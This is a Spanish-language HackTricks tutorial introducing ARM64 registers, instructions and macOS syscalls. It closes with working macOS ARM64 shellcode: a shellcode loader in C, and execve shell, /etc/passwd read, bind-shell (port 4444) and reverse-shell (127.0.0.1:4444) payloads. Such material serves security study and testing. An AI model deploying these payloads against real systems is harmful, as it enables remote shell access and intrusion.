# Introducción a ARM64

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Introducción a ARM64**

ARM64, también conocido como ARMv8-A, es una arquitectura de procesador de 64 bits utilizada en varios tipos de dispositivos, incluyendo teléfonos inteligentes, tabletas, servidores e incluso algunas computadoras personales de alta gama (macOS). Es un producto de ARM Holdings, una empresa conocida por sus diseños de procesadores eficientes en energía.

### **Registros**

ARM64 tiene **31 registros de propósito general**, etiquetados como `x0` a `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que requieren solo valores de 32 bits, los mismos registros se pueden acceder en un modo de 32 bits utilizando los nombres w0 a w30.

1. **`x0`** a **`x7`** - Estos se utilizan típicamente como registros temporales y para pasar parámetros a subrutinas.
* **`x0`** también lleva los datos de retorno de una función.
2. **`x8`** - En el kernel de Linux, `x8` se utiliza como el número de llamada al sistema para la instrucción `svc`. **¡En macOS se utiliza x16!**
3. **`x9`** a **`x15`** - Registros temporales adicionales, a menudo utilizados para variables locales.
4. **`x16`** y **`x17`** - Registros temporales, también utilizados para llamadas de función indirectas y stubs de PLT (Procedure Linkage Table).
* **`x16`** se utiliza como el número de llamada al sistema para la instrucción **`svc`**.
5. **`x18`** - Registro de plataforma. En algunas plataformas, este registro está reservado para usos específicos de la plataforma.
6. **`x19`** a **`x28`** - Estos son registros preservados por el llamado. Una función debe preservar los valores de estos registros para su llamador.
7. **`x29`** - Puntero de marco.
8. **`x30`** - Registro de enlace. Contiene la dirección de retorno cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register).
9. **`sp`** - Puntero de pila, utilizado para realizar un seguimiento de la parte superior de la pila.
10. **`pc`** - Contador de programa, que apunta a la siguiente instrucción a ejecutar.

### **Convención de Llamada**

La convención de llamada de ARM64 especifica que los **primeros ocho parámetros** de una función se pasan en los registros **`x0` a `x7`**. Los **parámetros adicionales** se pasan en la **pila**. El valor de **retorno** se pasa de vuelta en el registro **`x0`**, o en **`x1`** también **si es de 128 bits**. Los registros **`x19`** a **`x30`** y **`sp`** deben ser **preservados** en las llamadas a funciones.

Al leer una función en ensamblador, busca el **prólogo y epílogo de la función**. El **prólogo** generalmente implica **guardar el puntero de marco (`x29`)**, **configurar un nuevo puntero de marco** y **asignar espacio en la pila**. El **epílogo** generalmente implica **restaurar el puntero de marco guardado** y **retornar** de la función.

### Convención de Llamada en Swift

Swift tiene su propia **convención de llamada** que se puede encontrar en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

### **Instrucciones Comunes**

Las instrucciones de ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** que se va a realizar (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **fuente**. También se pueden utilizar valores inmediatos en lugar de registros fuente.

* **`mov`**: **Mover** un valor de un **registro** a otro.
* Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
* **`ldr`**: **Cargar** un valor de **memoria** en un **registro**.
* Ejemplo: `ldr x0, [x1]` — Esto carga un valor desde la ubicación de memoria apuntada por `x1` en `x0`.
* **`str`**: **Almacenar** un valor de un **registro** en **memoria**.
* Ejemplo: `str x0, [x1]` — Esto almacena el valor en `x0` en la ubicación de memoria apuntada por `x1`.
* **`ldp`**: **Cargar Par de Registros**. Esta instrucción **carga dos registros** desde **ubicaciones de memoria consecutivas**. La dirección de memoria generalmente se forma sumando un desplazamiento al valor en otro registro.
* Ejemplo: `ldp x0, x1, [x2]` — Esto carga `x0` y `x1` desde las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
* **`stp`**: **Almacenar Par de Registros**. Esta instrucción **almacena dos registros** en **ubicaciones de memoria consecutivas**. La dirección de memoria generalmente se forma sumando un desplazamiento al valor en otro registro.
* Ejemplo: `stp x0, x1, [x2]` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
* **`add`**: **Sumar** los valores de dos registros y almacenar el resultado en un registro.
* Ejemplo: `add x0, x1, x2` — Esto suma los valores en `x1` y `x2` y almacena el resultado en `x0`.
* **`sub`**: **Resta** los valores de dos registros y almacena el resultado en un registro.
* Ejemplo: `sub x0, x1, x2` — Esto resta el valor en `x2` de `x1` y almacena el resultado en `x0`.
* **`mul`**: **Multiplica** los valores de **dos registros** y almacena el resultado en un registro.
* Ejemplo: `mul x0, x1, x2` — Esto multiplica los valores en `x1` y `x2` y almacena el resultado en `x0`.
* **`div`**: **Divide** el valor de un registro por otro y almacena el resultado en un registro.
* Ejemplo: `div x0, x1, x2` — Esto divide el valor en `x1` por `x2` y almacena el resultado en `x0`.
* **`bl`**: **Branch with link**, se utiliza para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
* Ejemplo: `bl myFunction` — Esto llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
* **`blr`**: **Branch with Link to Register**, se utiliza para **llamar** a una **subrutina** donde el destino está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`.
* Ejemplo: `blr x1` — Esto llama a la función cuya dirección está contenida en `x1` y almacena la dirección de retorno en `x30`.
* **`ret`**: **Retorna** de una **subrutina**, típicamente utilizando la dirección en **`x30`**.
* Ejemplo: `ret` — Esto retorna de la subrutina actual utilizando la dirección de retorno en `x30`.
* **`cmp`**: **Compara** dos registros y establece las banderas de condición.
* Ejemplo: `cmp x0, x1` — Esto compara los valores en `x0` y `x1` y establece las banderas de condición en consecuencia.
* **`b.eq`**: **Branch if equal**, basado en la instrucción `cmp` anterior.
* Ejemplo: `b.eq label` — Si la instrucción `cmp` anterior encontró dos valores iguales, esto salta a `label`.
* **`b.ne`**: **Branch if Not Equal**. Esta instrucción verifica las banderas de condición (que fueron establecidas por una instrucción de comparación anterior), y si los valores comparados no son iguales, salta a una etiqueta o dirección.
* Ejemplo: Después de una instrucción `cmp x0, x1`, `b.ne label` — Si los valores en `x0` y `x1` no son iguales, esto salta a `label`.
* **`cbz`**: **Compare and Branch on Zero**. Esta instrucción compara un registro con cero, y si son iguales, salta a una etiqueta o dirección.
* Ejemplo: `cbz x0, label` — Si el valor en `x0` es cero, esto salta a `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrucción compara un registro con cero, y si no son iguales, salta a una etiqueta o dirección.
* Ejemplo: `cbnz x0, label` — Si el valor en `x0` no es cero, esto salta a `label`.
* **`adrp`**: Calcula la **dirección de página de un símbolo** y la almacena en un registro.
* Ejemplo: `adrp x0, symbol` — Esto calcula la dirección de página de `symbol` y la almacena en `x0`.
* **`ldrsw`**: **Carga** un valor firmado de **32 bits** desde la memoria y lo **extiende a 64 bits**.
* Ejemplo: `ldrsw x0, [x1]` — Esto carga un valor firmado de 32 bits desde la ubicación de memoria apuntada por `x1`, lo extiende a 64 bits y lo almacena en `x0`.
* **`stur`**: **Almacena un valor de registro en una ubicación de memoria**, utilizando un desplazamiento desde otro registro.
* Ejemplo: `stur x0, [x1, #4]` — Esto almacena el valor en `x0` en la dirección de memoria que es 4 bytes mayor que la dirección actual en `x1`.
* &#x20;**`svc`** : Realiza una **llamada al sistema**. Significa "Supervisor Call". Cuando el procesador ejecuta esta instrucción, **cambia del modo de usuario al modo kernel** y salta a una ubicación específica en la memoria donde se encuentra el código de manejo de llamadas al sistema del kernel.
*   Ejemplo:&#x20;

```armasm
mov x8, 93  ; Carga el número de llamada al sistema para salir (93) en el registro x8.
mov x0, 0   ; Carga el código de estado de salida (0) en el registro x0.
svc 0       ; Realiza la llamada al sistema.
```

### **Prólogo de la función**

1.  **Guarda el registro de enlace y el puntero de marco en la pila**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; almacena el par x29 y x30 en la pila y decrementa el puntero de pila
```
{% endcode %}
2. **Configura el nuevo puntero de marco**: `mov x29, sp` (configura el nuevo puntero de marco para la función actual)
3. **Asigna espacio en la pila para variables locales** (si es necesario): `sub sp, sp, <size>` (donde `<size>` es el número de bytes necesarios)

### **Epílogo de la función**

1. **Desasigna las variables locales (si se asignaron)**: `add sp, sp, <size>`
2.  **Restaura el registro de enlace y el puntero de marco**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; carga el par x29 y x30 desde la pila e incrementa el puntero de pila
```
{% endcode %}
3. **Retorna**: `ret` (devuelve el control al llamador utilizando la dirección en el registro de enlace)

## macOS

### Llamadas al sistema BSD

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Las llamadas al sistema BSD tendrán **x16 > 0**.

### Trampas de Mach

Consulta [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Las trampas de Mach tendrán **x16 < 0**, por lo que debes llamar a los números de la lista anterior con un **signo menos**: **`_kernelrpc_mach_vm_allocate_trap`** es **`-10`**.

También puedes consultar **`libsystem_kernel.dylib`** en un desensamblador para encontrar cómo llamar a estas llamadas al sistema (y a las llamadas al sistema BSD).
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
A veces es más fácil verificar el código **descompilado** de **`libsystem_kernel.dylib`** que verificar el **código fuente** porque el código de varias llamadas al sistema (BSD y Mach) se genera mediante scripts (verificar comentarios en el código fuente), mientras que en la dylib se puede encontrar qué se está llamando.
{% endhint %}

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Código C para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) y explicado.

{% tabs %}
{% tab title="con adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="con stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de parámetros (que en memoria significa una pila de direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar un comando con sh desde un fork para que el proceso principal no sea terminado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Shell de conexión

Shell de conexión desde [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) en **puerto 4444**.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell inversa

Desde [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
